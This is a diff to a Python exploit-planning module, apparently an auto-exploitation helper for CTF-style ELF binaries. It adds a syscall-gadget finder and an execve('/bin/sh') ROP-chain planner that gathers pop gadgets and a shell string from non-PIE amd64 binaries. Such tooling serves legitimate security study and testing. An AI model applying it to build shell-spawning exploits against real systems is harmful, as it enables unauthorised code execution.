@@ -883,6 +883,24 @@ def find_ret_gadget(image: ElfImage) -> int | None:
     return None
 
 
+def find_syscall_gadget(image: ElfImage) -> int | None:
+    """실행 가능 섹션에서 ``syscall``(0x0F 0x05) 바이트의 가상주소를 찾는다.
+
+    execve syscall ROP 체인의 종단 가젯. 뒤따르는 명령(보통 ``ret``)은 execve 성공
+    시 프로세스가 교체되므로 중요하지 않다 — 순수 ``syscall`` 바이트 위치면 충분하다.
+    non-PIE 에서는 그대로 쓸 수 있는 절대주소다. 없으면 None.
+    """
+
+    for section in image.sections:
+        if not section.executable or not section.addr or section.size <= 0:
+            continue
+        blob = image.data[section.offset : section.offset + section.size]
+        idx = blob.find(b"\x0f\x05")
+        if idx != -1:
+            return section.addr + idx
+    return None
+
+
 def binary_exec_range(image: ElfImage) -> tuple[int, int] | None:
     """바이너리 자체 실행코드의 가상주소 범위 ``(lo, hi)``. 없으면 None.
 
@@ -945,6 +963,50 @@ def ret2system_plan(image: ElfImage) -> dict | None:
     if pop_rdi is None or binsh is None or system is None:
         return None
     return {"pop_rdi": pop_rdi, "binsh": binsh, "system": system}
+
+
+def execve_plan(image: ElfImage) -> dict | None:
+    """amd64 execve("/bin/sh", 0, 0) syscall ROP 체인 구성요소를 정적으로 수집.
+
+    ``system`` 이 링크돼 있지 않은(예: 정적 링크로 unused 심볼이 제거됐거나 애초에
+    호출하지 않는) 바이너리를 위한 경로다. 다음을 **모두** non-PIE 절대주소로 찾으면
+    ``{"pop_rdi", "pop_rsi", "pop_rdx", "pop_rax", "binsh", "syscall"}`` 를 반환한다:
+
+    - ``pop rdi/rsi/rdx/rax ; ret`` **클린 가젯**(부작용 있는 가젯은 체인을 깨므로 배제,
+      :func:`find_clean_pop`)
+    - ``/bin/sh`` 문자열(:func:`find_binsh`)
+    - ``syscall`` 가젯(:func:`find_syscall_gadget`)
+
+    하나라도 없으면 None. 작은 동적 바이너리에는 ``pop rdx``·``pop rax`` 클린 가젯이
+    없는 경우가 많아(그때는 자동 구성 불가) 정적 링크 바이너리에서 주로 성립한다.
+    32-bit 은 호출규약(int 0x80)이 달라 대상 아님.
+    """
+
+    if (image.bits or 64) != 64:
+        return None
+    pop_rdi = find_clean_pop(image, "rdi")
+    pop_rsi = find_clean_pop(image, "rsi")
+    pop_rdx = find_clean_pop(image, "rdx")
+    pop_rax = find_clean_pop(image, "rax")
+    binsh = find_binsh(image)
+    syscall = find_syscall_gadget(image)
+    if (
+        pop_rdi is None
+        or pop_rsi is None
+        or pop_rdx is None
+        or pop_rax is None
+        or binsh is None
+        or syscall is None
+    ):
+        return None
+    return {
+        "pop_rdi": pop_rdi,
+        "pop_rsi": pop_rsi,
+        "pop_rdx": pop_rdx,
+        "pop_rax": pop_rax,
+        "binsh": binsh,
+        "syscall": syscall,
+    }
 
 
 def ret2libc_plan(image: ElfImage) -> dict | None:
